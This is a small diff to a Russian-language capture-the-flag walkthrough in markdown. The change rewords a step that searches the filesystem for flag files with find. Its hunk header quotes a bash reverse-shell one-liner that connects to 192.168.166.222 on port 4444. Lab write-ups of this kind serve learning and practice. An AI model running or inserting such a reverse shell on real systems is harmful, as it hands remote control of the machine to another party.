@@ -82,7 +82,9 @@ bash -c 'bash -i >& /dev/tcp/192.168.166.222/4444 0>&1'
 
 ![oops, problems with load](images/FirstFlag.jpg)
 
-Теперь решил поискать с помощью find, введя команду
+---
+
+Теперь решил поискать флаги с помощью ```find```, введя команду:
 ```bash
 find / -name "*flag*" 2>/dev/null
 ```
